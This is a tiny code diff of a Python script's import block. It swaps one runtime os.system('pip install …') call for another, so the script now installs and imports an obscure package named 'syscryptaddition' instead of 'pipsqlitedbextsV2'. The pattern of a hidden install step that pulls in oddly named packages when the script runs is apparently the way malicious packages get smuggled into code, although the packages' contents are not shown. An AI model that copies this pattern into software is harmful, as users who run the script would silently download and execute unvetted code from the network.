@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbextsV2")
-import pipsqlitedbextsV2
+os.system("pip install syscryptaddition")
+import syscryptaddition
 import random
 import requests
 import time
